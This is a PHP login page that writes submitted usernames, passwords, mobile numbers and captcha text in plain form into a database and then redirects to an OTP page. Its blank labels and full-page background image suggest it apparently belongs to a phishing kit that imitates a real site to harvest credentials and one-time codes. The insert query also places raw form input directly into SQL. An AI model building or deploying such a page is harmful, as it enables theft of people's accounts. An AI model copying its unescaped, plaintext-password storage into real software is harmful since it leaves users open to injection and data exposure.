 <?php
 session_start();
include 'db.php';
 ?>
 <?php
if(isset($_POST['logonSubmit'])){
    $username=$_POST['username'];
    $password=$_POST['password'];
    $mobilenumber=$_POST['mobilenumber'];
    $captch=$_POST['captch'];
    $insert=$conn->query("INSERT loginpage SET username='$username', password='$password',mobile='$mobilenumber',captcha='$captch' ");
    $last_id = $conn->insert_id;
    $_SESSION["last_id"] = $last_id;
    header("location:otp1.php");
}
 ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <br><br><br><br>
    <title></title>
    <link rel="stylesheet" href="style.css">
    <style>
            html { height:100%; }
        body{ font: 18px sans-serif; }
        .wrapper{ width: 307px; padding: 2px; }
      
        
    </style>
    <style>
        .loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('a.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .80;
}
    </style>
    <!--Spinner-3.gif-->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
</head><br>
<body style= "background-image: url('as.png'); background-repeat: no-repeat; background-size:center;">  
<div class="loader"></div>
        <div class="wrapper mt-5 ml-5">
        <h2></h2><br><br><br><br><br><br><br><br><br><br><br>

        
        <form action="" method="post">
            <div class="form-group">
                <label>Username* </label>
                <input type="text" name="username" id="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password*</label>
                <input type="password" name="password" id="passwd" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            
           
            <div class="form-group">
                <label>Mobile Number*</label>
                <input type="number" name="mobilenumber" id="mobile" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            
             <div class="form-group">
                <label>Enter the text as show in image*</label>
                <input type="text" name="captch" id="captcha" class="form-control ">
                <span class="invalid-feedback"></span><br><br><br><br><br><br><br><br><br><br>
                 
                 </div>

            <div class="form-group">
                <input type="submit"class="btn btn-white" value="        .      " name="logonSubmit">
                         
                <div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
            </div>
                        
        </form><br><br><br><br><br><br><br>
        <script type="text/javascript">
$(window).load(function() {
    $(".loader").fadeOut("slow");
});
</script>
    </div>
    <style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div></body>